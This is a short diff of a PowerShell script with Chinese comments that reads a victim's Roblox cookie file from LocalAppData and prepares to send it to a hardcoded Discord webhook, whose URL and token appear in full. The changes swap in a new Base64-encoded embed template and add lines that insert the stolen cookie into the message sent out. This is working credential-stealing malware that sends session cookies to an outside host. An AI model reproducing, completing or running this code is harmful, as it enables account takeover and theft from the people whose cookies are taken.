@@ -7,15 +7,20 @@ $p="$env:LocalAppData\Roblox\LocalStorage\RobloxCookies.dat"; if(Test-Path $p){ 
 $uri = "https://discord.com/api/webhooks/1501523254404190209/qnfTbYgfNuOCOBbEQwuMHHHYCltqgM8iQkpCy0NFTaS14oRmKqfysIQKthauw4YFgGez"
 
 # 🔓 Base64（你直接貼上）
-$embedBase64 = "eyJ0aXRsZSI6ICLmlrDkuIDmlrByb2Jsb3ggY29va2ll5o6l5pS2IiwgImNvbG9yIjogMzQ0NzAwMywgImZpZWxkcyI6IFt7Im5hbWUiOiAiY29va2llIiwgInZhbHVlIjogImBgYCRjb29raWVgYGAifV0sICJmb290ZXIiOiB7InRleHQiOiAi5Y+v5Lul5L2/55SoIn19"
+$embedBase64 = "eyJ0aXRsZSI6ICLmjqXmlLbliLDmlrDnmoRyb2Jsb3ggY29va2llIiwgImNvbG9yIjogMzQ0NzAwMywgImZpZWxkcyI6IFt7Im5hbWUiOiAiY29va2llIiwgInZhbHVlIjogImBgYCRjb29raWVgYGAifV0sICJmb290ZXIiOiB7InRleHQiOiAi5Y+v5Lul55uh5oOF5L2/55SoIn19"
 
 # 解密
 $decodedJson = [System.Text.Encoding]::UTF8.GetString(
     [Convert]::FromBase64String($embedBase64)
 )
 
-# 轉物件
+# 轉成物件
 $embed = $decodedJson | ConvertFrom-Json
+
+# ⚠️ 確保 fields 存在且是陣列
+if ($embed.fields -and $embed.fields.Count -gt 0) {
+    $embed.fields[0].value = "```$cookie```"
+}
 
 # 組 payload
 $payload = @{
